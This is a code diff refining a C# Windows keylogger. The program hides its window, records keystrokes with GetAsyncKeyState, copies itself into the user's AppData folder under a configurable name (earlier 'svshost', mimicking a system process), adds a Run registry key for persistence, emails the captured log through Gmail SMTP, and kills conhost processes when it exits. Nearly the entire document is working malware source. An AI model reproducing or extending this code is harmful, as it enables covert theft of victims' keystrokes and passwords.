@@ -7,6 +7,7 @@ using Microsoft.Win32;
 using System.IO;
 using System.IO.Compression;
 using System.Collections.Generic;
+using System.Diagnostics;
 
 namespace KeyLogger
 {
@@ -19,12 +20,18 @@ namespace KeyLogger
         public const int SPACEKEY = 32;
         public const int SW_HIDE = 0;
         public const int COUNTKEYS = 255;
-        public const string AppName = "svshost";
-        //public const string GuidFirst = "8c4d2677-1f83-45f7-90b3-8723f400d800";
+        public string AppName;
         public static int idx = 0; // to do
-        public const List<String> Guids = new List<String>() { "8c4d2677-1f83-45f7-90b3-8723f400d800", "91456c6f-a9e7-4e81-a157-138bfe6ad66a" };
+        public String Guid;
+        public DateTime LastTimeMail;
         #endregion
+        public KeyLoggerClass()
+        {
+            this.Guid = "8c4d2677-1f83-45f7-90b3-8723f400d800";
+            this.AppName = System.Configuration.ConfigurationSettings.AppSettings["AppName"];
+            LastTimeMail = DateTime.Now;
 
+        }
         #region WinAPI
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -47,13 +54,18 @@ namespace KeyLogger
         #region ConsoleOnClose
 
         public delegate bool ConsoleEventDelegate(int eventType);
-
+         
         public static bool ConsoleEventCallback(int eventType)
         {
-            if (eventType == 2)
+            if (eventType == 2) // if event = close console
             {
                 myFile.Close();
-                KeyLoggerClass.Email_Send();
+                KeyLoggerClass.EmailSend();
+                foreach (var process in Process.GetProcessesByName("conhost"))
+                {
+                    process.Kill();
+                }
+                //Environment.Exit(0);
                 return true;
             }
             return false;
@@ -63,7 +75,19 @@ namespace KeyLogger
 
         #endregion
 
-        public static void Email_Send() 
+        public bool CheckTime()
+        {
+
+            if (this.LastTimeMail.TimeOfDay.Hours <= DateTime.Now.TimeOfDay.Hours - 1)
+            {
+                return true;
+            }
+            else 
+                return false;
+        
+        }
+        
+        public static void EmailSend() 
         {
             MailMessage mail = new MailMessage();
             SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
@@ -81,11 +105,14 @@ namespace KeyLogger
             SmtpServer.EnableSsl = true;
             SmtpServer.Send(mail);
         }
-        public static void MoveToWindowsFolder()
+        public void MoveToAppDataFolder()
         {
-            String CopiedProgrammPath = "c:\\users\\" + Environment.UserName + "\\Appdata\\Local";
 
+            String CopiedProgrammPath = "c:\\users\\" + Environment.UserName + "\\Appdata\\Local";
+            //MessageBox.Show(Application.ExecutablePath.Replace(".exe", ".vshost.exe") + ".vshost.exe.config");
             //ZipFile zip = new ZipFile();
+           // MessageBox.Show(Application.ExecutablePath.Replace(".EXE", ".vshost.exe"), this.AppName + ".vshost.exe");
+
             String file = Application.ExecutablePath;
             String to = "d:\\tmp.zip";
             //string startPath = @"c:\example\start";
@@ -101,43 +128,44 @@ namespace KeyLogger
             }
             using (ZipArchive zip = ZipFile.Open(to, ZipArchiveMode.Update))
             {
-                zip.CreateEntryFromFile(file, AppName + ".exe");
+                zip.CreateEntryFromFile(file, this.AppName + ".exe");
+                Thread.Sleep(10);                
+                zip.CreateEntryFromFile(file + ".config", this.AppName + ".exe.config");
+                Thread.Sleep(10);
+                zip.CreateEntryFromFile(file.Replace(".exe", ".vshost.exe.config"), this.AppName + ".vshost.exe.config");
+                Thread.Sleep(10);
+                zip.CreateEntryFromFile(file.Replace(".EXE", ".vshost.exe"), this.AppName + ".vshost.exe");
+                Thread.Sleep(10);
+
             }
             try
             {
                 ZipFile.ExtractToDirectory(to, extractPath);
+                Thread.Sleep(10);
             }
             catch 
             {
                 // already exists
             }
             File.Delete(to);
+            //File.Delete(Application.ExecutablePath);
         }
-            //File.Copy(from, to);
 
 
-            //string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-           // string dest = "C:\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
-            //System.IO.File.Copy(src, dest);
-
-
-        
-     // decrypt and ecrypt itself 
-        // then compile decrypted file and copy it somewhere
-        // csc
-        public static bool SetAutorunValue(bool autorun, String path)
+        public bool SetAutorunValue(bool autorun)
         {
             
             RegistryKey reg;
             reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
               //Microsoft.Win32.RegistryKey myKey =Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\", true);
               //myKey.SetValue(AppName, Application.ExecutablePath);
+            
             try
             {
                 if (autorun)
-                    reg.SetValue(Guids[idx], path); // to do 
-                else
-                    reg.DeleteValue(AppName);
+                {
+                    reg.SetValue(Guid, "c:\\users\\" + Environment.UserName + "\\Appdata\\Local\\" + this.AppName + ".exe"); 
+                }
                 reg.Close();
             }
             catch
@@ -145,7 +173,7 @@ namespace KeyLogger
                 return false;
             }
             return true;
-            idx++;
+            
         }
         public static void HideWindow()
         {
@@ -157,10 +185,10 @@ namespace KeyLogger
 
         public static void Main(string[] args)
         {
+            KeyLoggerClass obj = new KeyLoggerClass();
             HideWindow();
-            SetAutorunValue(true, Application.ExecutablePath);
-            MoveToWindowsFolder();
-            SetAutorunValue(true, "c:\\users\\" + Environment.UserName + "\\Appdata\\Local\\" + AppName + ".exe");
+            obj.MoveToAppDataFolder();
+            obj.SetAutorunValue(true);
             handler = new ConsoleEventDelegate(ConsoleEventCallback); // subscribe onclose event to ConsoleEventCallback
             SetConsoleCtrlHandler(handler, true);                     // subscribe onclose event to ConsoleEventCallback
             if (System.IO.File.Exists(filename)) // if file exists then delete it and create again
@@ -195,7 +223,7 @@ namespace KeyLogger
                             case ENDKEY:
                                 if (lastKey == HOMEKEY)
                                 {
-                                    myFile.WriteLineAsync("Home+End pressed!!!");
+                                    myFile.WriteLineAsync("+End pressed!!!");
                                     ConsoleEventCallback(2); // exit event code 
                                     Environment.Exit(0);
                                 }
